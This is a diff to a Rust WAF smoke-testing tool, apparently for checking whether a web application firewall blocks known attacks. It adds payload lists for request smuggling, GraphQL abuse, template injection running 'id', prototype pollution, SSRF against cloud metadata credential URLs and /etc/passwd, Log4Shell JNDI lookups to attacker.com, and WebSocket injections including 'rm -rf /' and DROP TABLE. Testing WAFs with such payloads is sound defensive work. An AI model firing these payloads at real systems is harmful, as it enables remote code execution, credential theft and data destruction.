@@ -4,8 +4,8 @@
 //! payloads and analysis techniques. It replaces the bash script with better detection,
 //! colorful output, and structured results for both CLI and UI consumption.
 
-use crate::engine::waf_mode_detector::{PayloadType, WafMode};
 use crate::effectiveness::static_detection::calculate_similarity;
+use crate::engine::waf_mode_detector::{PayloadType, WafMode};
 use crate::http::HttpClient;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
@@ -264,6 +264,96 @@ impl WafSmokeTest {
             ],
         );
 
+        // HTTP Request Smuggling
+        payloads.insert(
+            PayloadType::HttpRequestSmuggling,
+            vec![
+                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n".to_string(),
+                "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
+                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n".to_string(),
+                "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: ch\x00unked\r\n\r\n".to_string(),
+            ],
+        );
+
+        // GraphQL Injection
+        payloads.insert(
+            PayloadType::GraphQLInjection,
+            vec![
+                r#"{"query": "{ __schema { types { name } } }"}"#.to_string(),
+                r#"{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}"#
+                    .to_string(),
+                r#"query { user(id: "1") { name } user(id: "2") { name } }"#.to_string(),
+                r#"query { alias1: user(id: 1) { password } alias2: user(id: 2) { password } }"#
+                    .to_string(),
+                r#"mutation { updateUser(id: 1, role: "admin") { id role } }"#.to_string(),
+            ],
+        );
+
+        // Server-Side Template Injection (SSTI)
+        payloads.insert(
+            PayloadType::SSTI,
+            vec![
+                "{{7*7}}".to_string(),
+                "${7*7}".to_string(),
+                "#{7*7}".to_string(),
+                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(),
+                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}".to_string(),
+                "${{7*7}}".to_string(),
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
+            ],
+        );
+
+        // Prototype Pollution
+        payloads.insert(
+            PayloadType::PrototypePollution,
+            vec![
+                r#"{"__proto__": {"admin": true}}"#.to_string(),
+                r#"{"constructor": {"prototype": {"admin": true}}}"#.to_string(),
+                r#"{"__proto__": {"isAdmin": true, "role": "admin"}}"#.to_string(),
+                "?__proto__[admin]=true".to_string(),
+                "?constructor[prototype][admin]=true".to_string(),
+            ],
+        );
+
+        // Server-Side Request Forgery (SSRF)
+        payloads.insert(
+            PayloadType::SSRF,
+            vec![
+                "http://169.254.169.254/latest/meta-data/".to_string(),
+                "http://metadata.google.internal/computeMetadata/v1/".to_string(),
+                "http://169.254.169.254/metadata/instance".to_string(),
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
+                "http://localhost:8080/admin".to_string(),
+                "http://127.0.0.1:6379/".to_string(),
+                "file:///etc/passwd".to_string(),
+            ],
+        );
+
+        // Log4Shell (Log4j RCE)
+        payloads.insert(
+            PayloadType::Log4Shell,
+            vec![
+                "${jndi:ldap://attacker.com/a}".to_string(),
+                "${jndi:rmi://attacker.com/a}".to_string(),
+                "${${lower:j}ndi:${lower:l}dap://attacker.com/a}".to_string(),
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"
+                    .to_string(),
+                "${jndi:dns://attacker.com}".to_string(),
+                "${${env:ENV_VAR:-j}ndi:ldap://attacker.com/a}".to_string(),
+            ],
+        );
+
+        // WebSocket Injection
+        payloads.insert(
+            PayloadType::WebSocketInjection,
+            vec![
+                r#"{"type":"message","data":"<script>alert('XSS')</script>"}"#.to_string(),
+                r#"{"cmd":"exec","args":"rm -rf /"}"#.to_string(),
+                "Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Protocol: <script>alert(1)</script>".to_string(),
+                r#"{"event":"subscribe","channel":"'; DROP TABLE users; --"}"#.to_string(),
+            ],
+        );
+
         payloads
     }
 
@@ -297,8 +387,12 @@ impl WafSmokeTest {
         let summary = self.calculate_summary(&test_results);
         let waf_mode = self.determine_waf_mode(&test_results);
         let detected_waf = self.identify_waf_from_results(&test_results);
-        let recommendations =
-            self.generate_recommendations(&summary, &waf_mode, &detected_waf, endpoint_context.as_ref());
+        let recommendations = self.generate_recommendations(
+            &summary,
+            &waf_mode,
+            &detected_waf,
+            endpoint_context.as_ref(),
+        );
 
         let result = SmokeTestResult {
             url: url.to_string(),
@@ -551,10 +645,16 @@ impl WafSmokeTest {
 
     fn match_block_template(body_lower: &str) -> Option<&'static str> {
         let templates = [
-            ("CloudFlare", ["cloudflare", "attention required", "ray id"].as_slice()),
+            (
+                "CloudFlare",
+                ["cloudflare", "attention required", "ray id"].as_slice(),
+            ),
             ("Akamai", ["akamai", "reference", "incident id"].as_slice()),
             ("AWS WAF", ["request blocked", "aws waf"].as_slice()),
-            ("F5 BIG-IP", ["the requested url was rejected", "support id"].as_slice()),
+            (
+                "F5 BIG-IP",
+                ["the requested url was rejected", "support id"].as_slice(),
+            ),
             ("Sucuri", ["access denied", "sucuri"].as_slice()),
             ("Imperva", ["incapsula", "incident id"].as_slice()),
         ];
@@ -565,10 +665,7 @@ impl WafSmokeTest {
             .map(|(vendor, _)| *vendor)
     }
 
-    async fn analyze_endpoint_context(
-        &self,
-        url: &str,
-    ) -> Result<EndpointContext, anyhow::Error> {
+    async fn analyze_endpoint_context(&self, url: &str) -> Result<EndpointContext, anyhow::Error> {
         let baseline = self.http_client.get(url).await?;
         let probe_url = if url.contains('?') {
             format!("{url}&waf_probe=1")
@@ -973,7 +1070,9 @@ mod tests {
             smoke_test.classify_response(&response, "test");
 
         assert_eq!(classification, PayloadClassification::Blocked);
-        assert!(evidence.iter().any(|e| e.contains("Block page template match")));
+        assert!(evidence
+            .iter()
+            .any(|e| e.contains("Block page template match")));
         assert!(waf_indicators.iter().any(|w| w == "CloudFlare"));
     }
 
